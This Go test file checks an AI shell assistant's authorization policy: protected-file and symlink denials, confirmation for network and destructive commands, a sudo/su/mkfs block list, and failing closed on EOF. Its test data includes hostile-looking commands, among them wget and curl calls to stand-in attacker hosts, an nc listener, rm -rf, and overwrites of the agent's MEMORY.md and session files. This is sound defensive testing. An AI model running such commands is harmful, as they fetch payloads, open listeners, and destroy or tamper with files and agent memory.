package auth

import (
	"bytes"
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"zerotwo/pkg/shell"
)

func TestShellAssistantIntegration_ProtectedTargetsDenied(t *testing.T) {
	tmpDir := t.TempDir()
	policy := NewPolicy()
	blocked := []string{"sudo", "su"}

	// Test with autoYes=true to ensure autoYes NEVER overrides protected target denial
	authorizer := NewShellAuthorizer(policy, tmpDir, blocked, true)

	attackCommands := []string{
		"echo 'malicious' > MEMORY.md",
		"cat >> MEMORY.md",
		"rm MEMORY.md",
		"rm -f MEMORY.md",
		"touch MEMORY.md",
		"sed -i 's/a/b/' MEMORY.md",
		"truncate -s 0 MEMORY.md",
		"python3 -c 'open(\"MEMORY.md\",\"w\").write(\"hacked\")'",
		"echo '{}' > sessions/active.json",
		"rm -rf sessions/001.json",
		"cat /dev/null > sessions/session.json",
	}

	for _, cmd := range attackCommands {
		asst := shell.NewAssistant(nil, authorizer, true)
		var executed bool
		asst.SetExecutor(func(execCmd string) (int, error) {
			executed = true
			return 0, nil
		})

		var out bytes.Buffer
		// Even if stdin presents "yes\n", authorization must block prior to reading
		in := strings.NewReader("yes\n")
		asst.SetConfirmIO(in, &out)

		exitCode, err := asst.InteractiveLoop(context.Background(), cmd, "test query")
		if err == nil {
			t.Errorf("SECURITY DEFECT: expected error for cmd %q, got nil", cmd)
		}
		if exitCode != 1 {
			t.Errorf("cmd %q: expected exitCode 1, got %d", cmd, exitCode)
		}
		if executed {
			t.Errorf("CRITICAL SECURITY VULNERABILITY: assistant executed command targeting protected file: %q", cmd)
		}
		if !strings.Contains(out.String(), "SECURITY POLICY DENIAL") {
			t.Errorf("cmd %q: expected SECURITY POLICY DENIAL in output, got: %s", cmd, out.String())
		}
	}
}

func TestShellAssistantIntegration_SymlinkedProtectedTargetDenied(t *testing.T) {
	tmpDir := t.TempDir()
	memPath := filepath.Join(tmpDir, "MEMORY.md")
	if err := os.WriteFile(memPath, []byte("# Memory"), 0600); err != nil {
		t.Fatal(err)
	}

	symlinkPath := filepath.Join(tmpDir, "notes_link.md")
	if err := os.Symlink(memPath, symlinkPath); err != nil {
		t.Skip("symlinks not supported on this platform")
	}

	policy := NewPolicy()
	authorizer := NewShellAuthorizer(policy, tmpDir, nil, true)

	asst := shell.NewAssistant(nil, authorizer, true)
	var executed bool
	asst.SetExecutor(func(cmd string) (int, error) {
		executed = true
		return 0, nil
	})

	var out bytes.Buffer
	in := strings.NewReader("yes\n")
	asst.SetConfirmIO(in, &out)

	exitCode, err := asst.InteractiveLoop(context.Background(), "echo evil > notes_link.md", "overwrite notes")
	if err == nil {
		t.Fatal("expected error modifying symlink pointing to MEMORY.md")
	}
	if exitCode != 1 {
		t.Errorf("expected exitCode 1, got %d", exitCode)
	}
	if executed {
		t.Fatal("CRITICAL SECURITY VULNERABILITY: assistant executed write through symlink to MEMORY.md!")
	}
}

func TestShellAssistantIntegration_NetworkEgressExplicitApproval(t *testing.T) {
	policy := NewPolicy()
	tmpDir := t.TempDir()

	netCmds := []string{
		"curl -s https://evil.example.com",
		"wget -q http://attacker.com/payload",
		"ssh root@10.0.0.1",
		"nc -l 9999",
		"ping -c 1 8.8.8.8",
	}

	for _, cmd := range netCmds {
		// Test 1: autoYes = true, but user inputs "n\n" -> MUST NOT EXECUTE
		{
			authorizer := NewShellAuthorizer(policy, tmpDir, nil, true)
			asst := shell.NewAssistant(nil, authorizer, true)
			var executed bool
			asst.SetExecutor(func(c string) (int, error) {
				executed = true
				return 0, nil
			})

			var out bytes.Buffer
			in := strings.NewReader("n\n")
			asst.SetConfirmIO(in, &out)

			exitCode, err := asst.InteractiveLoop(context.Background(), cmd, "run net")
			if err != nil {
				t.Fatalf("cmd %q: unexpected error: %v", cmd, err)
			}
			if exitCode != 1 {
				t.Errorf("cmd %q: expected exitCode 1 for declined network command, got %d", cmd, exitCode)
			}
			if executed {
				t.Errorf("CRITICAL SECURITY DEFECT: network command %q executed when user declined under autoYes!", cmd)
			}
		}

		// Test 2: autoYes = true, user confirms "y\n" -> EXECUTES
		{
			authorizer := NewShellAuthorizer(policy, tmpDir, nil, true)
			asst := shell.NewAssistant(nil, authorizer, true)
			var executedCmd string
			asst.SetExecutor(func(c string) (int, error) {
				executedCmd = c
				return 0, nil
			})

			var out bytes.Buffer
			in := strings.NewReader("y\n")
			asst.SetConfirmIO(in, &out)

			exitCode, err := asst.InteractiveLoop(context.Background(), cmd, "run net")
			if err != nil {
				t.Fatalf("cmd %q: unexpected error: %v", cmd, err)
			}
			if exitCode != 0 {
				t.Errorf("cmd %q: expected exitCode 0, got %d", cmd, exitCode)
			}
			if executedCmd != cmd {
				t.Errorf("expected executedCmd %q, got %q", cmd, executedCmd)
			}
		}
	}
}

func TestShellAssistantIntegration_DestructiveRequiresExactYes(t *testing.T) {
	policy := NewPolicy()
	tmpDir := t.TempDir()
	authorizer := NewShellAuthorizer(policy, tmpDir, nil, true)

	destructiveCmd := "rm -rf /tmp/random-junk-test-dir"

	// Test 1: autoYes = true, user inputs single "y\n" -> MUST BE REJECTED
	{
		asst := shell.NewAssistant(nil, authorizer, true)
		var executed bool
		asst.SetExecutor(func(c string) (int, error) {
			executed = true
			return 0, nil
		})

		var out bytes.Buffer
		in := strings.NewReader("y\n")
		asst.SetConfirmIO(in, &out)

		exitCode, err := asst.InteractiveLoop(context.Background(), destructiveCmd, "clean")
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if exitCode != 1 {
			t.Errorf("expected exitCode 1 for single 'y' on destructive command, got %d", exitCode)
		}
		if executed {
			t.Fatal("CRITICAL SECURITY DEFECT: destructive command executed with single 'y' instead of 'yes'!")
		}
	}

	// Test 2: autoYes = true, user inputs exact "yes\n" -> EXECUTES
	{
		asst := shell.NewAssistant(nil, authorizer, true)
		var executedCmd string
		asst.SetExecutor(func(c string) (int, error) {
			executedCmd = c
			return 0, nil
		})

		var out bytes.Buffer
		in := strings.NewReader("yes\n")
		asst.SetConfirmIO(in, &out)

		exitCode, err := asst.InteractiveLoop(context.Background(), destructiveCmd, "clean")
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if exitCode != 0 {
			t.Errorf("expected exitCode 0, got %d", exitCode)
		}
		if executedCmd != destructiveCmd {
			t.Errorf("expected executedCmd %q, got %q", destructiveCmd, executedCmd)
		}
	}
}

func TestShellAssistantIntegration_BlockedCommandDenied(t *testing.T) {
	policy := NewPolicy()
	tmpDir := t.TempDir()
	blocked := []string{"sudo", "su", "mkfs"}
	authorizer := NewShellAuthorizer(policy, tmpDir, blocked, true)

	asst := shell.NewAssistant(nil, authorizer, true)
	var executed bool
	asst.SetExecutor(func(c string) (int, error) {
		executed = true
		return 0, nil
	})

	var out bytes.Buffer
	in := strings.NewReader("yes\n")
	asst.SetConfirmIO(in, &out)

	exitCode, err := asst.InteractiveLoop(context.Background(), "sudo reboot", "reboot system")
	if err == nil {
		t.Fatal("expected error for blocked command 'sudo', got nil")
	}
	if exitCode != 1 {
		t.Errorf("expected exitCode 1, got %d", exitCode)
	}
	if executed {
		t.Fatal("SECURITY DEFECT: blocked command 'sudo' executed!")
	}
	if !strings.Contains(out.String(), "SECURITY POLICY DENIAL") {
		t.Errorf("expected security denial message, got: %s", out.String())
	}
}

func TestShellAssistantIntegration_FailClosedNonInteractive(t *testing.T) {
	policy := NewPolicy()
	tmpDir := t.TempDir()
	authorizer := NewShellAuthorizer(policy, tmpDir, nil, false) // autoYes = false

	asst := shell.NewAssistant(nil, authorizer, false)
	var executed bool
	asst.SetExecutor(func(c string) (int, error) {
		executed = true
		return 0, nil
	})

	var out bytes.Buffer
	// EOF on input simulating detached headless or non-interactive pipe
	in := strings.NewReader("")
	asst.SetConfirmIO(in, &out)

	exitCode, err := asst.InteractiveLoop(context.Background(), "curl https://example.com", "fetch")
	if err == nil {
		t.Fatal("expected error when confirmation reader yields EOF, got nil")
	}
	if exitCode != 1 {
		t.Errorf("expected exitCode 1 on EOF, got %d", exitCode)
	}
	if executed {
		t.Fatal("SECURITY DEFECT: command executed on non-interactive EOF!")
	}
}
